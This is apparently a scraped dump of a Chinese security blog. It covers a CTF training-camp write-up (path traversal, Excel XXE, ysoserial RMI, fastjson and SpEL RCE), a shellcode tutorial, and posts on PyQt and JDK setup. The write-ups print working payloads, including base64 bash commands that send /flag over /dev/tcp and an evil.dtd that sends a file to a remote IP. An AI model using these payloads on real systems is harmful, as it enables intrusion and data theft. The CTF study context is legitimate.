观察了一下结果，4个等号（base64最多只会有3个等号）、全是大写字母、有数字出现都说明了这是base32编码，直接拿去解码发现是乱码，看下附件的第二个内容 12BASE:&quot;GHI45FQRSCX****UVWJK67DELMNOPAB3&quot; 仔细观察了一下，空缺的4个字符很明显需要爆破，不过发现没有字符重复，末尾没有等号，应该不是一段需要爆破的base32码，而是一段base32的私有表 爆破+变表解码 12345678910111213141516171819import base64import stringbase32 = &quot;TCMDIEOH2MJFBLKHT2J7BLYZ2WUE5NYR2HNG====&quot;string1 = &quot;GHI45FQRSCX&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;UVWJK67DELMNOPAB3&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;t = &#x27;2TYZ&#x27;for i in t: for j in t: for k in t: for l in t: if i != j != k != l : str = string1.format(i,j,k,l) try: print(base64.b32decode(base32.translate(string.maketrans(str,string2))).decode()) except: pass 从输出中选一个正常的flag即可","categories":[{"name":"CTF","slug":"CTF","permalink":"https://vvmdx.github.io/categories/CTF/"}],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://vvmdx.github.io/tags/WriteUp/"}]},{"title":"Pycharm+PyQT5/Pyside2开发python图形界面","slug":"2021-09-19-Pycharm+PyQT5Pyside2开发python图形界面","date":"2021-09-18T16:00:00.000Z","updated":"2021-09-19T05:42:59.731Z","comments":true,"path":"2021/09/19/2021-09-19-Pycharm+PyQT5Pyside2开发python图形界面/","link":"","permalink":"https://vvmdx.github.io/2021/09/19/2021-09-19-Pycharm+PyQT5Pyside2%E5%BC%80%E5%8F%91python%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2/","excerpt":"","text":"Pycharm+PyQT5/Pyside2开发python图形界面 os：win10 环境：python3.9 工具：pycharm2021 图形化界面库：pyside2或pyqt5 区别： pyside2是python官方库，2018年才有的，目前文档不是特别多 pyqt5比较成熟，出现的早，文档比较详细，pyqt5不可闭源商用（必须开源） 相同点： 代码几乎一样，甚至包几乎都是一样的，从pyqt5到pyside2几乎没有学习成本 安装库 pyqt5 pip3 install PyQt5 -i https://pypi.douban.com/simple pip3 install PyQt5-tools -i https://pypi.douban.com/simple pyside2 pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pyside2 QtDesigner配置 使用QtDesigner快速制作图形化界面 File &gt;&gt; Settings &gt;&gt; Tools &gt;&gt; External Tools &gt;&gt; + Name：随便填 Program：designer.exe路径（直接everything搜索designer.exe就可以了） PyQT5一般为../site-packages/pyqt5_tools/designer.exe或者../site-packages/qt5_applications/Qt/bin/designer.exe Pyside2为../site-packages/PySide2/designer.exe Working directory：$FileDir$ PyUic配置 把Qt的.ui文件转为.py文件 继续在External Tools里添加 第一种配置方法 Program：python3.exe地址 Arguments：-m PyQt5.uic.pyuic $FileName$ -o $FileNameWithoutExtension$.py Working directory：$FileDir$ 第二种配置方法 Program：D:\\DevelopTools\\Python-3.9.5\\Scripts\\pyuic5.exe Arguments：$FileName$ -o $FileNameWithoutExtension$.py Working directory：$FileDir$ 挑一种配就好了，都一样 PyRcc配置 将资源文件转码 配置和pyuic差不多 Program：D:\\DevelopTools\\Python-3.9.5\\Scripts\\pyrcc5.exe Arguments：$FileName$ -o $FileNameWithoutExtension$_rc.py Working directory：$FileDir$ QtDesigner使用 到这里就全部配置完成了 在Tool中点击即可打开QtDesigner界面 设计完成后保存为.ui文件，回到pycharm就可以看到了 将.ui文件转为.py文件：右键test.ui &gt;&gt; External Tools &gt;&gt; PyUic 点击后即生成对应的test.py文件 Python中打开窗口 静态加载 即先转为.py文件，再使用该文件打开窗口 代码如下 1234567891011import sysfrom PyQt5.QtWidgets import QApplication, QMainWindowimport first # module first.pyif __name__ == &#x27;__main__&#x27;: app = QApplication(sys.argv) myMainWindow = QMainWindow() myUi = first.Ui_MainWindow() myUi.setupUi(myMainWindow) myMainWindow.show() sys.exit(app.exec_()) 动态加载 无需转为.py文件，直接导入.ui文件 优点：在QtDesigner设计修改后保存的.ui文件可以直接动态加载出来，不用再转为.py文件 代码如下： 12345678910111213141516171819from PySide2.QtCore import QFilefrom PySide2.QtWidgets import QApplicationfrom PySide2.QtUiTools import QUiLoaderclass Test: def __init__(self): # 从文件中加载UI定义 qfile = QFile(&quot;ui/test.ui&quot;) qfile.open(QFile.ReadOnly) qfile.close() # 从 UI 定义中动态 创建一个相应的窗口对象 self.ui = QUiLoader().load(qfile)app = QApplication([])test = Test()test.ui.show()app.exec_()","categories":[{"name":"系统&工具&环境配置","slug":"系统-工具-环境配置","permalink":"https://vvmdx.github.io/categories/%E7%B3%BB%E7%BB%9F-%E5%B7%A5%E5%85%B7-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"环境&工具","slug":"环境-工具","permalink":"https://vvmdx.github.io/tags/%E7%8E%AF%E5%A2%83-%E5%B7%A5%E5%85%B7/"}]},{"title":"山石安研第一届CTF训练营","slug":"2021-08-31-山石安研第一届CTF训练营","date":"2021-08-30T16:00:00.000Z","updated":"2021-11-20T02:15:45.262Z","comments":true,"path":"2021/08/31/2021-08-31-山石安研第一届CTF训练营/","link":"","permalink":"https://vvmdx.github.io/2021/08/31/2021-08-31-%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8ACTF%E8%AE%AD%E7%BB%83%E8%90%A5/","excerpt":"","text":"山石安研第一届CTF训练营 过去一周参加了山石安研的ctf训练营，做了几道题感觉还是颇有意义，虽然不难，但是算是某些类型的典型题吧，靶机可能访问不到了，不过关键还是在于记录下一些思路和分析过程吧 这些题目分别涉及目录穿越、Excel XXE、反序列化、RMI、fastjson 1.2.47 RCE、shiro反序列化CVE-2016-4437、spel注入等知识点 最后一道后来发现是p神的一道题，javacon的表达式沙盒绕过 https://github.com/phith0n/code-breaking/tree/master/2018/javacon 最近发现博客访问人数突然多了，，本来只想自己记录下学习过程，现在意外的发现还有分享的作用，顺便放几道代审题的附件吧 链接：https://pan.baidu.com/s/1I4z7-jBcOUyt1d4lDR-8zQ 提取码：2333 作业一wp 知识点：任意文件下载、目录穿越、代码审计、Excel XXE 地址：http://58.240.236.228:32013/ 进去后是一个上传文件的地方，一开始还以为是上传个一句话木马的php，但是上传后发现他并不会解析成可访问路径，不过在下载文件的接口发现需要传一个filename，尝试更改一些其他的文件名，发现当文件名含有flag时会返回禁止读取，当传空参时回显500，爆出疑似项目路径 尝试目录穿越访问该web项目的配置文件 12# payloadhttp://58.240.236.228:32013/file_in_java/DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/web.xml 获取到项目源码的包名后，直接通过这个接口下载三个class文件 12# payloadhttp://58.240.236.228:32013/file_in_java/DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class 放入jd-gui反编译，重点关注UploadServlet，可以看到在红色框标识处的条件判断，当文件名以“excel-”开头且为“xlsx”后缀的文件时会使用POI解析这个excel文档，因此考虑excel xxe 首先新建一个.xlsx格式的excel文档，修改后缀名为.zip，然后解压，在[Content_Types].xml中插入一段xml，作用是从远程服务器获取evil.dtd文件，其中%all;%send;是定义在evil.dtd中的，evil.dtd作用是读取根目录下的flag文件并发送到远程服务器的9000端口 [Content_Types].xml插入部分 1234&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://1.14.169.109:8000/evil.dtd&quot;&gt;%remote;%all;%send;]&gt; evil.dtd 12&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://1.14.169.109:9000?file=%file;&#x27;&gt;&quot;&gt; 改完xml后将文件夹重新压缩回zip，然后文件名改为excel-.xlsx以满足条件判断让服务器解析该文档 evil.dtd文件则上传到vps（我用的是腾讯云） 123scp 本地文件地址 vps账号@vps公网ip:服务器文件地址scp /mnt/hgfs/Kali_share/evil.dtd root@x.x.x.x:/root/evil.dtd然后输入vps密码就可以了 接着登录vps，进入evil.dtd所在的文件夹，用python开启一个web服务 123# python2 3使用方法不一样，但是效果一样python2 -m SimpleHTTPServerpython3 -m http.server 这个服务默认开启在8000端口，访问[ip:port]即可看到目录下的evil.dtd 接着根据我们写的evil.dtd，会将读取到的flag发送到9000端口，因此用nc监听该端口 1nc -lvvp 9000 然后上传文件即可发现服务器从我们的vps下载了evil.dtd，且将数据发送到了9000端口 作业二wp 知识点：代码审计、反序列化 直接idea打开项目，源码很少，只有一个类，直接看关键方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class Hello &#123; ..... @PostMapping(&quot;/attack&quot;) @ResponseBody public String attack(HttpServletRequest req)&#123; try&#123; String strstr = &quot;iwantflag&quot;; // 从request读取数据流 BufferedReader br = new BufferedReader(new InputStreamReader(req.getInputStream())); StringBuffer sb=new StringBuffer(); String s; // 将数据流写到Stringbuffer里 while((s=br.readLine())!=null)&#123; sb.append(s); &#125; // Base64解密数据流 byte[] bytes = (new BASE64Decoder()).decodeBuffer(sb.toString()); // 将字节数组转化为输入流 ByteArrayInputStream bais = new ByteArrayInputStream(bytes); // 将输入流反序列化为HashMap对象 ObjectInputStream ois = new ObjectInputStream(bais); HashMap obj = (HashMap) ois.readObject(); // 读取HashMap对象中的键值对 Set&lt;Object&gt; objset = obj.keySet(); Iterator it = objset.iterator(); while(it.hasNext())&#123; Object key = it.next(); // 当key为URL类的一个实例对象时通过条件判断 if(key.getClass() == URL.class)&#123; // 获取URL实例对象key的host属性的值 String url = ((URL)key).getHost(); // 若该值包含strstr=&quot;iwantflag&quot;则读取flag if(url.contains(strstr))&#123; return getFlag(); &#125; &#125; &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; return &quot;zai try try:(&quot;; &#125; ....&#125; 分析完流程就很好做了，读取flag的正向流程如下 123456读取数据流 -&gt;Base64解密 -&gt;反序列化为HashMap对象 -&gt;HashMap对象的键为URL类的一个对象 -&gt;该对象的host属性的值包含&quot;iwantflag&quot;字符串 -&gt;读取flag 接下来我们只要逆向构造出一个满足条件的HashMap对象，并将其序列化后base64解密即可 12345678910111213141516171819202122232425262728public static void test() throws IOException &#123; String strstr = &quot;iwantflag&quot;; HashMap hashMap = new HashMap(); // URL类的构造方法需要4个参数，其中第二个参数即为host，也就是getHost()方法获取到的参数，其他几个随便写就行 URL urlObj = new URL(&quot;http&quot;,&quot;iwantflag&quot;,9000,&quot;&quot;); // 设置key-value对，关键是key必须为URL类的对象，value无所谓，用不到 hashMap.put(urlObj,&quot;&quot;); Set&lt;Object&gt; objectSet = hashMap.keySet(); Iterator iterator = objectSet.iterator(); while (iterator.hasNext()) &#123; Object key = iterator.next(); if(key.getClass() == URL.class)&#123; String url = ((URL)key).getHost(); if(url.contains(strstr))&#123; // 以上几行都是为了模拟正向读取flag进行的判断，实际上对流程没影响 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(baos); // 将HashMap序列化后写入流 outputStream.writeObject(hashMap); outputStream.close(); // 将流的字节数组base64加密 String encodeStr = new BASE64Encoder().encode(baos.toByteArray()); // 打印结果 System.out.println(encodeStr); &#125; &#125; &#125;&#125; 打印出来的结果直接丢到burp里面发送即可获取flag 作业三wp 知识点：jmeter反序列化rce、CVE-2018-1297 地址：58.240.236.228:31099（是个rmi服务） 既然都是rmi了，题目又有jmeter，直接拿去搜，找到一个Jmeter RMI的反序列化漏洞CVE-2018-1297，而且ysoserial也集成了exp，直接使用，然后执行读取flag的命令重定向发送到我们自己的vps，然后自己在vps上监听端口即可 1java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 58.240.236.228 31099 BeanShell1 &#x27;bash -c &#123;echo,Y2F0IC9mbGFnID4mIC9kZXYvdGNwLzEuMTQuMTY5LjEwOS85MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; 参考：https://vulhub.org/#/environments/jmeter/CVE-2018-1297/ 关于[cmd]部分为何长这样：因为当调用Runtime.getRuntime().exec()时，会因为重定向符号“&gt;”被错误解释，因此当我们的cmd需要使用重定向符时需要经过Base64编码和bash的重新编排 原cmd： 1cat /flag &gt;&amp; /dev/tcp/ip/9000 0&gt;&amp;1 转换后： 工具地址：http://www.jackson-t.ca/runtime-exec-payloads.html 作业四wp 知识点：fastjson 1.2.47 RCE 地址：58.240.236.228:38833 访问后返回一个json格式化的数据 抓包，修改GET为POST，添加头部Content-Type: application/json，发送一段不完整的json探测一下，确定是fastjson dnslog探测一下，没问题 首先编写Exploit.java，目的是让目标服务器通过rmi加载然后执行 执行的命令为cat /flag &gt;&amp; /dev/tcp/1ip/9000 0&gt;&amp;1经过base64和shell编码编排后的结果 1234567891011import java.io.IOException;import java.lang.Runtime;public class Exploit &#123; static &#123; try &#123; Runtime.getRuntime().exec(&quot;bash -c &#123;echo,Y2F0IC9mbGFnID4mIC9kZXYvdGNwLzEuMTQuMTY5LjEwOS85MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;); &#125; catch (IOException ignored) &#123; &#125; &#125;&#125; 准备工具 官方项目https://github.com/mbechler/marshalsec，可以自己打包为jar 打包好的：https://github.com/CaijiOrz/fastjson-1.2.47-RCE，还带有教程 将jar包和Exploit一起上传到vps 在目录下开启web服务 python3 -m http.server 监听9000端口 nc -lvvp 9000 开启rmi服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://ip:8000/#Exploit&quot; 9999 发送payload到服务器即可 1&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://ip:9999/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125; ShiroSpel 知识点：代码审计、表达式注入、黑名单过滤绕过、CVE-2016-4437 地址：58.240.236.228:33014 反编译后直接看MainController 关注以下两个关键方法 首先是登录页面，代码如下 123456789101112131415@PostMapping(&#123;&quot;/login&quot;&#125;)public String login(@RequestParam(value = &quot;username&quot;,required = true) String username, @RequestParam(value = &quot;password&quot;,required = true) String password, @RequestParam(value = &quot;remember-me&quot;,required = false) String isRemember, HttpSession session, HttpServletResponse response) &#123; if (this.userConfig.getUsername().contentEquals(username) &amp;&amp; this.userConfig.getPassword().contentEquals(password)) &#123; session.setAttribute(&quot;username&quot;, username); if (isRemember != null &amp;&amp; !isRemember.equals(&quot;&quot;)) &#123; Cookie c = new Cookie(&quot;remember-me&quot;, this.userConfig.encryptRememberMe()); c.setMaxAge(2592000); response.addCookie(c); &#125; return &quot;redirect:/&quot;; &#125; else &#123; return &quot;redirect:/login-error&quot;; &#125;&#125; 接受三个参数，其中username和password均为admin（写在application.yml里面） remember-me为可选参数，当不为空时，调用加密函方法，并设置为Cookie值，加密方法如下 12345678910111213141516171819// UserConfigpublic String encryptRememberMe() &#123; String encryptd = Encryptor.encrypt(this.rememberMeKey, &quot;0123456789abcdef&quot;, this.username); return encryptd;&#125;//Encryptorpublic static String encrypt(String key, String initVector, String value) &#123; try &#123; IvParameterSpec iv = new IvParameterSpec(initVector.getBytes(&quot;UTF-8&quot;)); SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes(&quot;UTF-8&quot;), &quot;AES&quot;); Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;); cipher.init(1, skeySpec, iv); byte[] encrypted = cipher.doFinal(value.getBytes()); return Base64.getUrlEncoder().encodeToString(encrypted); &#125; catch (Exception var7) &#123; logger.warn(var7.getMessage()); return null; &#125;&#125; 容易看出用了aes加密，其中初始向量iv=0123456789abcdef，密钥rememberMeKey=c0dehack1nghere1（同样写在application.yml里 以上是登录的流程的分析，若登录成功，则会跳转到根页面hello，以下是关键代码分析 1234567891011121314151617@GetMappingpublic String admin(@CookieValue(value = &quot;remember-me&quot;,required = false) String rememberMeValue, HttpSession session, Model model) &#123; if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(&quot;&quot;)) &#123; String username = this.userConfig.decryptRememberMe(rememberMeValue); if (username != null) &#123; session.setAttribute(&quot;username&quot;, username); &#125; &#125; Object username = session.getAttribute(&quot;username&quot;); if (username != null &amp;&amp; !username.toString().equals(&quot;&quot;)) &#123; model.addAttribute(&quot;name&quot;, this.getAdvanceValue(username.toString())); return &quot;hello&quot;; &#125; else &#123; return &quot;redirect:/login&quot;; &#125;&#125; 接受一个可选参数remember-me，若非空，则调用解密函数，将解密结果赋值给username，持久化后返回hello页面，在hello页面返回前还执行了model.addAttribute(&quot;name&quot;, this.getAdvanceValue(username.toString()));，这个方法大概作用就是： 将username进行黑名单过滤，黑名单就一个Runtime.getRuntime().exec() 解析SpEL表达式 解析结果返回hello页面 123456789101112131415161718// 为了阅读方便，我将var2、3、4等变量改为其实际意义以便阅读private String getAdvanceValue(String username) &#123; String[] blackList = this.keyworkProperties.getBlacklist(); int blackList_length = blackList.length; for(int i = 0; i &lt; blackList_length; ++i) &#123; String keyword = backList[i]; Matcher matcher = Pattern.compile(keyword, 34).matcher(username); if (matcher.find()) &#123; throw new HttpClientErrorException(HttpStatus.FORBIDDEN); &#125; &#125; ParserContext parserContext = new TemplateParserContext(); Expression exp = this.parser.parseExpression(username, parserContext); SmallEvaluationContext evaluationContext = new SmallEvaluationContext(); return exp.getValue(evaluationContext).toString();&#125; 到这里整个程序的关键部分基本已经分析完了，思路也容易想到： 首先先登录系统 接着使用aes的密钥和初始向量加密一段payload，作为cookie里的remember-me的值发送 服务器将解密结果赋值给username，经过黑名单过滤后交给SpEl表达式解析 我们的目的就是让表达式解析我们的恶意payload而造成rce 先测试一下我们的思路对不对，首先用源码的加密方式加密字符串2*2，然后把密文当作cookie的remember-me发送 结果我惊了，好消息是加密方式没错，确实能将username设置为我们想要的内容，坏消息是他压根没被解析出来，按理来说应该得是4才对，经过调试后发现，在ParserContext parserContext = new TemplateParserContext();定义了表达式的模板（或者说是格式），其中TemplateParserContext类规定了表达式的形式是#&#123;Expression Language&#125;的形式，这就好办了，我们把#&#123;2*2&#125;加密一下重新尝试 居然还是不行…但是我自己写了个类又是没问题的，后来重新看代码的时候才发现，，后端设值语句为model.addAttribute(&quot;name&quot;, this.getAdvanceValue(username.toString()));，而前端取值语句为&lt;h2 th:text=&quot;'Hello, ' + $&#123;session.username&#125;&quot;&gt;&lt;/h2&gt;，完全不对应，，，等于说后端其实是执行了的，只是没有把执行结果返回前端而已（一时竟不知这是出题人失误还是故意的） 现在只剩下最后过个黑名单了，这个也十分简单，用反射+字符串拆分就行，编写payload如下 1String value = &quot;#&#123;T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;).getMethod(&#x27;ex&#x27;+&#x27;ec&#x27;, T(String[])).invoke(T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;).getMethod(&#x27;getRun&#x27;+&#x27;time&#x27;).invoke(T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;)), new String[]&#123;&#x27;calc.exe&#x27;&#125;)&#125;&quot;; 对payload进行加密后，本地起项目尝试发送，成功弹窗，说明已经完成rce，最后就是读取flag了 最后将执行的命令改为读取flag并带出，payload如下 1String value = &quot;#&#123;T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;).getMethod(&#x27;ex&#x27;+&#x27;ec&#x27;, T(String[])).invoke(T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;).getMethod(&#x27;getRun&#x27;+&#x27;time&#x27;).invoke(T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;)), new String[]&#123;&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;&#123;echo,Y2F0IC9mbGFnID4mIC9kZXYvdGNwLzEuMTQuMTY5LjEwOS85MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&#125;)&#125;&quot;; 监听端口，成功获取flag 最后想了一下，这道题虽然没用shiro但是还是叫这个名的意思大概是因为在spel表达式注入之前的漏洞利用的是shiro的CVE-2016-4437？就也是因为AES硬编码、使用默认密钥导致的，通过cookie的rememberMe参数注入的漏洞","categories":[{"name":"CTF","slug":"CTF","permalink":"https://vvmdx.github.io/categories/CTF/"}],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://vvmdx.github.io/tags/WriteUp/"}]},{"title":"Kali2021安装多版本jdk及切换","slug":"2021-08-28-Kali2021安装多版本jdk及切换","date":"2021-08-27T16:00:00.000Z","updated":"2021-09-19T05:24:40.474Z","comments":true,"path":"2021/08/28/2021-08-28-Kali2021安装多版本jdk及切换/","link":"","permalink":"https://vvmdx.github.io/2021/08/28/2021-08-28-Kali2021%E5%AE%89%E8%A3%85%E5%A4%9A%E7%89%88%E6%9C%ACjdk%E5%8F%8A%E5%88%87%E6%8D%A2/","excerpt":"","text":"Kali2021安装多版本jdk及切换 这几天做题的时候要复现个漏洞环境，其中有个步骤是用java跑开启rmi的jar包，没想到因为java版本太高而出现警告 查看java版本 1java -version Kali2021预装了一个jdk11 查看系统内有多少个java环境 1update-alternatives --config java 目前应该只有一个/usr/lib/jvm/java-11-openjdk-amd64/bin/java 若有其他的有可能是因为安装的其他工具顺带有java环境 切换java环境 若没有，则官网下载，找jdk-8u301-linux-x64.tar.gz这个 下载完自己创个文件夹放进去，我是放在根目录下的packages文件夹 进入文件夹解压 1root@kali2021:/packages# tar -zxvf jdk-8u301-linux-x64.tar.gz 配置环境变量 123export JAVA_HOME=/packages/jdk1.8.0_301export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport PATH=$PATH:$JAVA_HOME/bin 设置序列号 1update-alternatives --install /usr/bin/java java /packages/jdk1.8.0_301/bin/java 3 回到步骤2，查看有多少个java环境，然后步骤3切换，再输入java -version时发现已经切换为jdk1.8了","categories":[{"name":"系统&工具&环境配置","slug":"系统-工具-环境配置","permalink":"https://vvmdx.github.io/categories/%E7%B3%BB%E7%BB%9F-%E5%B7%A5%E5%85%B7-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"环境&工具","slug":"环境-工具","permalink":"https://vvmdx.github.io/tags/%E7%8E%AF%E5%A2%83-%E5%B7%A5%E5%85%B7/"}]},{"title":"Shellcode基础","slug":"2021-08-16-Shellcode基础","date":"2021-08-15T16:00:00.000Z","updated":"2021-08-31T10:47:11.806Z","comments":true,"path":"2021/08/16/2021-08-16-Shellcode基础/","link":"","permalink":"https://vvmdx.github.io/2021/08/16/2021-08-16-Shellcode%E5%9F%BA%E7%A1%80/","excerpt":"","text":"Shellcode基础 基本原理 shellcode通常是一小段用于利用软件漏洞的机器代码，目的是为了获得目标机器的shell 本地shellcode常用于提权，攻击者利用高权限程序中的漏洞获得与目标进程相同的权限 远程shellcode通过TCP/IP套接字为攻击者提供shell访问（反弹shell、绑定shell、套接字重用shell） shellcode可分段执行，由一段短的shellcode去加载一段复杂的shellcode 编写 C语言 C编写简单shellcode 1234567# include &quot;stdlib.h&quot;# include &quot;unistd.h&quot;int main() &#123; system(&quot;/bin/sh&quot;); exit(0);&#125; 执行效果如下，可以看到已经拿到shell C语言使用内联汇编方式调用shellcode，使用的shellcode为汇编生成的opcode（先看汇编那一节） 12345678910111213141516171819202122#include &quot;stdio.h&quot;#include &lt;string.h&gt;char shellcode[] = &quot;\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80&quot;;int main() &#123; printf(&quot;Shellcode length: %d bytes\\n&quot;, strlen(shellcode)); (*(void(*)()) shellcode)();/* __asm__(&quot;movl $0xffffffff, %eax\\n\\t&quot; &quot;movl %eax, %ebx\\n\\t&quot; &quot;movl %eax, %ecx\\n\\t&quot; &quot;movl %eax, %edx\\n\\t&quot; &quot;movl %eax, %esi\\n\\t&quot; &quot;movl %eax, %edi\\n\\t&quot; &quot;movl %eax, %ebp\\n\\t&quot; &quot;call shellcode&quot;);*/ return 0;&#125; 12# -z execstack用于禁用NX保护机制gcc -m32 -z execstack shellcode.c -o shellcode 汇编 21个字节实现execve(&quot;/bin/sh&quot;)的Linux 32位程序（2种都可以） 123456789101112; shell1global_startsection .text_start: push 0x68732f ; &quot;/sh&quot; push 0x6e69622f ; &quot;/bin&quot; mov ebx, esp ; ebx=&quot;/bin/sh&quot; xor ecx, ecx ; ecx=0 xor edx, edx ; edx=0 mov eax, 0xb ; system_number int 0x80 ; 软中断 12345678910111213;shell2global_startsection .text_start: xor ecx, ecx ; ecx=0 mul ecx ; eax=0 edx=0 mov al, 11 ; execve syscall number push ecx push 0x68732f2f ; &quot;//sh&quot; push 0x6e69622f ; &quot;/bin&quot; mov ebx, esp ; pointer int 0x80 push的理解 /bin/sh用16进制表示为2f62696e2f7368 由于是小端序，因此/sh=0x68 0x73 0x2f，由于不足4个字节，用'/' (0x2f)补足即&quot;//sh&quot; = 0x68732f2f 同理，&quot;/bin&quot; = 0x6e69622f 压栈顺序：h &gt;&gt; s &gt;&gt; / &gt;&gt; / &gt;&gt; n &gt;&gt; i &gt;&gt; b &gt;&gt; / xor的理解 shellcode中不能包含NULL，因为NULL会将字符串操作函数阶段，这样执行的shellcode就会被截断 xor ecx, ecx用于替换mov ecx, 0x00 寄存器的理解 mov ebx, esp：将栈顶指针赋给ebx mov eax, 0xb：0xb = 11，execve的系统调用号为11 xor ecx(edx), ecx(edx)：清空ecx和edx寄存器 软中断 由于一般shellcode有长度限制而且我们不知道系统函数地址，无法直接调用 触发中断（int 0x80或者syscall）进行系统调用 system(&quot;/bin/sh&quot;)底层是调用execve(&quot;/bin/sh&quot;,0,0) 12345678# 编译nasm -f elf32 shell.asm# 使用ld进行链接获得shellld -m elf_i386 shell.o -o shell# 执行shell已经可以拿到shell./shell# 查看shell的操作码objdump -d shell 因此shellcode为&quot;\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb8\\x0b\\x00\\x00\\x00\\xcd\\x80&quot; shell2的shellcode为&quot;\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80&quot; gdb详细信息如下 Linux 64位 shellcode30字节 1234567891011121314global _startsection .text_start: xor rdx, rdx mov qword rbx, &#x27;//bin/sh&#x27; shr rbx, 0x8 push rbx mov rdi, rsp push rax push rdi mov rsi, rsp mov al, 0x3b syscall 编译并链接 123# 注意现在是64位了nasm -f elf64 shell_64bit.asm ld -m elf_x86_64 shell_64bit.o -o shell_64bit python 使用pwntools生成shellcode 123from pwn import *context(log_level=&#x27;debug&#x27;, arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)shellcode=asm(shellcraft.sh())","categories":[{"name":"PWN","slug":"PWN","permalink":"https://vvmdx.github.io/categories/PWN/"}],"tags":[{"name":"教学&思路&过程","slug":"教学-思路-过程","permalink":"https://vvmdx.github.io/tags/%E6%95%99%E5%AD%A6-%E6%80%9D%E8%B7%AF-%E8%BF%87%E7%A8%8B/"}]},{"title":"java反序列化基础","slug":"2021-08-13-java反序列化基础","date":"2021-08-12T16:00:00.000Z","updated":"2021-08-13T02:57:16.949Z","comments":true,"path":"2021/08/13/2021-08-13-java反序列化基础/","link":"","permalink":"https://vvmdx.github.io/2021/08/13/2021-08-13-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/","excerpt":"","text":"java反序列化基础 序列化：将对象转化为字节流以便传递 反序列化：序列化逆过程，字节流转化为对象 漏洞成因：反序列化类中有执行系统命令的代码，而没有对序列化字节流进行检测 工具：ysoserial 序列化与反序列化 实体类实现java.io.Serializable接口 serialVersionId用于标识序列化类的版本，防止类名相同导致反序列化错误 静态属性（static）、transient修饰的属性不参与序列化过程 12345678910111213141516171819202122232425// 实体类public class User implements Serializable &#123; public static final long serialVersionUID = 1L; public String name; public int id; public String sex; public User() &#123; this(&quot;alice&quot;,123, &quot;female&quot;); &#125; public User(String name, int id, String sex) &#123; this.name = name; this.id = id; this.sex = sex; &#125; private void writeObject(ObjectOutputStream s) throws IOException &#123; s.defaultWriteObject(); &#125; private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException &#123; s.defaultReadObject(); &#125;&#125; 序列化通过ObjectOutputStream.writeObject(Object)实现 反序列化通过ObjectInputStream.readObject(Object)实现 java在序列化和反序列化时，若实体类实现了Serializable接口，则会调用其中的writeObject和readObject方法 123456789101112131415161718192021222324// Serialize是自己编写的接口public interface Serialize &#123; void output(Object obj,String file) throws IOException; void input(String file) throws IOException, ClassNotFoundException;&#125;// SerializeImpl实现了自己写的接口public class SerializeImpl implements Serialize &#123; public void output(Object obj, String file) throws IOException &#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(file)); outputStream.writeObject(obj); outputStream.close(); &#125; public void input(String file) throws IOException, ClassNotFoundException &#123; ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(file)); Object outUser = inputStream.readObject(); 